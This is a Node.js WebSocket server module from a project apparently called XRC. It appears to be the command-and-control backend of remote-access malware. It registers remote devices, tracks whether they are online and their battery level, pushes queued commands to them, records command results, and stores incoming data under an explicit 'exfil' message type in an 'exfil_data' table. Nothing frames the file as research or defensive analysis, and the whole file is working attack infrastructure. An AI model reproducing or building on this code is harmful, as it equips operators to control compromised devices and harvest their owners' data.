// ============================================================
// FILE: XRC/server/src/ws/websocket.js
// ============================================================
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const { getDatabase } = require('../db/database');

// Map of device_id -> WebSocket connection
const deviceConnections = new Map();

// Map of device_id -> connection metadata
const deviceMetadata = new Map();

function initWebSocket(server) {
    const wss = new WebSocket.Server({
        server,
        path: '/ws',
        maxPayload: 50 * 1024 * 1024 // 50MB
    });

    wss.on('connection', (ws, req) => {
        const connectionId = uuidv4();
        let deviceId = null;

        console.log(`[WS] New connection: ${connectionId} from ${req.socket.remoteAddress}`);

        // Extract device_id from URL query
        const url = new URL(req.url, `http://${req.headers.host}`);
        deviceId = url.searchParams.get('id');

        ws.isAlive = true;
        ws.connectionId = connectionId;

        ws.on('message', (data) => {
            try {
                const message = JSON.parse(data.toString());
                handleMessage(ws, message, connectionId);
            } catch (err) {
                console.error(`[WS] Invalid message from ${connectionId}: ${err.message}`);
                ws.send(JSON.stringify({ type: 'error', error: 'Invalid message format' }));
            }
        });

        ws.on('close', (code, reason) => {
            console.log(`[WS] Connection closed: ${connectionId} (${code})`);
            handleDisconnect(ws, deviceId);
        });

        ws.on('pong', () => {
            ws.isAlive = true;
        });

        ws.on('error', (err) => {
            console.error(`[WS] Error on ${connectionId}: ${err.message}`);
            handleDisconnect(ws, deviceId);
        });

        // Send welcome message
        ws.send(JSON.stringify({
            type: 'welcome',
            id: connectionId,
            ts: Date.now(),
            payload: JSON.stringify({ version: '1.0.0', server_time: Date.now() })
        }));
    });

    // Heartbeat interval to detect dead connections
    const heartbeatInterval = setInterval(() => {
        wss.clients.forEach((ws) => {
            if (ws.isAlive === false) {
                console.log(`[WS] Terminating dead connection: ${ws.connectionId}`);
                return ws.terminate();
            }
            ws.isAlive = false;
            ws.ping();
        });
    }, 30000);

    wss.on('close', () => {
        clearInterval(heartbeatInterval);
    });

    console.log('[WS] WebSocket server initialized');
    return wss;
}

function handleMessage(ws, message, connectionId) {
    const { type, device_id, id, payload } = message;

    if (!type) {
        ws.send(JSON.stringify({ type: 'error', error: 'Message type required' }));
        return;
    }

    const db = getDatabase();

    switch (type) {
        case 'register': {
            // Device registration
            const devId = device_id || payload?.device_id;
            if (devId) {
                deviceConnections.set(devId, ws);
                deviceMetadata.set(devId, {
                    connectionId,
                    connectedAt: Date.now(),
                    lastHeartbeat: Date.now(),
                    ipAddress: ws._socket?.remoteAddress
                });

                // Update database
                const existing = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(devId);
                if (existing) {
                    db.prepare('UPDATE devices SET is_online = 1, last_seen = strftime("%s","now") WHERE device_id = ?').run(devId);
                }

                ws.deviceId = devId;
                console.log(`[WS] Device registered: ${devId}`);

                // Send any pending commands
                sendPendingCommands(devId);
            }
            break;
        }

        case 'heartbeat': {
            const devId = device_id || ws.deviceId;
            if (devId) {
                const meta = deviceMetadata.get(devId);
                if (meta) {
                    meta.lastHeartbeat = Date.now();
                }

                db.prepare('UPDATE devices SET last_seen = strftime("%s","now"), is_online = 1, battery_level = COALESCE(?, battery_level) WHERE device_id = ?')
                    .run(payload?.battery, devId);

                ws.send(JSON.stringify({
                    type: 'heartbeat_ack',
                    id: `hb_ack_${Date.now()}`,
                    device_id: devId,
                    ts: Date.now(),
                    payload: JSON.stringify({ server_time: Date.now() })
                }));
            }
            break;
        }

        case 'cmd_result':
        case 'command_result': {
            const cmdId = id;
            const devId = device_id || ws.deviceId;
            if (cmdId && devId) {
                db.prepare('UPDATE commands SET status = ?, result = ?, completed_at = strftime("%s","now") WHERE id = ?')
                    .run('completed', payload, cmdId);
            }
            break;
        }

        case 'cmd_error':
        case 'command_error': {
            const cmdId = id;
            const devId = device_id || ws.deviceId;
            if (cmdId && devId) {
                db.prepare('UPDATE commands SET status = ?, error = ?, completed_at = strftime("%s","now") WHERE id = ?')
                    .run('error', payload, cmdId);
            }
            break;
        }

        case 'exfil':
        case 'sensor_data': {
            const devId = device_id || ws.deviceId;
            const exfilType = payload?.type || type;
            const dataStr = typeof payload === 'string' ? payload : JSON.stringify(payload);

            if (devId) {
                db.prepare(`
                    INSERT INTO exfil_data (id, device_id, type, data, received_at)
                    VALUES (?, ?, ?, ?, strftime('%s','now'))
                `).run(uuidv4(), devId, exfilType, dataStr);

                db.prepare('UPDATE devices SET last_seen = strftime("%s","now"), is_online = 1 WHERE device_id = ?').run(devId);
            }
            break;
        }

        case 'log': {
            const devId = device_id || ws.deviceId;
            if (payload) {
                db.prepare('INSERT INTO logs (level, source, message, data, created_at) VALUES (?, ?, ?, ?, strftime("%s","now"))')
                    .run(payload.level || 'info', devId || 'device', payload.message || '', JSON.stringify(payload));
            }
            break;
        }

        default:
            console.log(`[WS] Unknown message type from ${device_id || 'unknown'}: ${type}`);
    }
}

function handleDisconnect(ws, deviceId) {
    const devId = deviceId || ws.deviceId;
    if (devId) {
        deviceConnections.delete(devId);
        deviceMetadata.delete(devId);

        const db = getDatabase();
        db.prepare('UPDATE devices SET is_online = 0 WHERE device_id = ?').run(devId);
        console.log(`[WS] Device disconnected: ${devId}`);
    }
}

/**
 * Send a command to a specific device via WebSocket.
 * Returns true if device was connected and message sent.
 */
function sendToDevice(deviceId, message) {
    const ws = deviceConnections.get(deviceId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(message));
        return true;
    }
    return false;
}

/**
 * Send all pending commands to a device.
 */
function sendPendingCommands(deviceId) {
    const db = getDatabase();
    const pending = db.prepare(
        "SELECT * FROM commands WHERE device_id = ? AND status = 'pending' ORDER BY priority DESC, created_at ASC LIMIT 10"
    ).all(deviceId);

    for (const cmd of pending) {
        const sent = sendToDevice(deviceId, {
            type: 'cmd',
            id: cmd.id,
            device_id: cmd.device_id,
            ts: cmd.created_at * 1000,
            payload: JSON.stringify(cmd)
        });

        if (sent) {
            db.prepare('UPDATE commands SET status = ?, executed_at = strftime("%s","now") WHERE id = ?')
                .run('in_progress', cmd.id);
        }
    }
}

/**
 * Get list of connected device IDs.
 */
function getConnectedDevices() {
    return Array.from(deviceConnections.keys());
}

/**
 * Broadcast message to all connected devices.
 */
function broadcastToDevices(message) {
    const data = JSON.stringify(message);
    deviceConnections.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data);
        }
    });
}

module.exports = {
    initWebSocket,
    sendToDevice,
    getConnectedDevices,
    broadcastToDevices,
    deviceConnections
};
